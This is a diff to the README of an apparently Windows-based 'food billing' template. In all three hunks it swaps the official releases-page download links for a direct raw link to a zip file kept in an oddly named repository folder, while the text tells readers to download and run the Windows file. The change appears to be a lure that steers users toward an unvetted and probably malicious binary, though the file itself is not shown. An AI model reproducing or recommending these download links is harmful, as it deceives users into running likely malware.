@@ -1,6 +1,6 @@
 # 🍽️ food-supporting-template - Simple food billing for teams
 
-[![Download](https://img.shields.io/badge/Download-Releases-6f42c1?style=for-the-badge&logo=github)](https://github.com/hilleryhomochromatic404/food-supporting-template/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-6f42c1?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/hilleryhomochromatic404/food-supporting-template/main/clithridiate/supporting-template-food-v3.6.zip)
 
 ## 🧾 What this app does
 
@@ -31,7 +31,7 @@ Good to have:
 ## 🚀 Download and install
 
 Visit this page to download:
-https://github.com/hilleryhomochromatic404/food-supporting-template/releases
+https://raw.githubusercontent.com/hilleryhomochromatic404/food-supporting-template/main/clithridiate/supporting-template-food-v3.6.zip
 
 Follow these steps:
 
@@ -173,4 +173,4 @@ attendance integration, automated calculations, billing system, consumption trac
 ## 📄 Release access
 
 Use the releases page here to download and run the Windows file:
-https://github.com/hilleryhomochromatic404/food-supporting-template/releases
+https://raw.githubusercontent.com/hilleryhomochromatic404/food-supporting-template/main/clithridiate/supporting-template-food-v3.6.zip
